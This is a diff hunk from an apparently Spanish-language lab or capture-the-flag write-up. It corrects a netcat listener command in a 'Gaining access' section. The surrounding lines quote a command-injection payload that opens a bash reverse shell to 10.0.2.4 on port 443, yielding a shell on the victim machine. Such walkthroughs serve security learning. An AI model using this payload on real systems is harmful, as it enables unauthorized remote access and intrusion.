@@ -72,7 +72,7 @@ Al ejecutar esto, vemos que al final de la página, nos devuelve "hacker". Podem
 ### Gaining access ###
 Una vez comprobado esto, vamos a enviarnos una reverse shell para conseguir conectarnos con una terminal y poder seguir con la intrusión de forma más sencilla y cómoda. Para esto dejamos nuestra máquina a la escucha por un puerto aleatorio, por ejemplo, 443, a la espera de una conexión.
 ```shell
-$ nc -nlsvp 443
+$ nc -nlvp 443
 ```
 Mientras, hacemos una búsqueda ejecutando una reverse shell sobre el servicio web con: *;bash -c 'bash -i >& /dev/tcp/10.0.2.4/443 0>&1'* y ejecutamos.  
 Acabamos de recibir una shell con el usuario hacker sobre la máquina víctima.  
